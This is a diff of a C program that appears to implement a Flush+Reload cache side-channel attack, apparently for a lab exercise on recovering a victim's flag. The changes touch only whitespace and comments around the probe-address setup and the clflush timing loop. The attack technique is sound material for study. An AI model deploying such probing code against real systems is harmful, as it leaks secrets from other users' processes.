@@ -45,7 +45,7 @@ int main(void)
 
     // g8r0 in 0x2200 -> b0 | 010_0010_00 | 00_0000
     // g8r21 in 0x17200 -> b10 | 111_0010_00 | 00_0000
-    // rounds are 0x1000 apart 
+    // rounds are 0x1000 apart
     // different set each roudn
     // but there is wrap around every8?
     // also, victim code keeps accessing entry on a loop
@@ -70,8 +70,8 @@ int main(void)
     // one probe line per group gi_r0 sits at ENTRY + i*STRIDE, its own set
     ADDR_PTR addr[NGROUPS]; // 22 groups
     for (int i = 0; i < NGROUPS; i++)
-        addr[i] = (ADDR_PTR)(vic + ENTRY + i * STRIDE); 
-        // vic has pointer to start of victim too
+        addr[i] = (ADDR_PTR)(vic + ENTRY + i * STRIDE);
+    // vic has pointer to start of victim too
 
     // fisher yates shuffle again
     srand(time(NULL) ^ getpid());
@@ -88,9 +88,9 @@ int main(void)
 
     // flush+reload fast is victim flag
     int hits[NGROUPS] = {0};
-    for (int r = 0; r < ROUNDS; r++)
+    for (int r = 0; r < ROUNDS; r++) // 2000 times
     {
-        for (int k = 0; k < NGROUPS; k++)
+        for (int k = 0; k < NGROUPS; k++) // 64 times
         {
             int i = order[k];
             clflush(addr[i]);
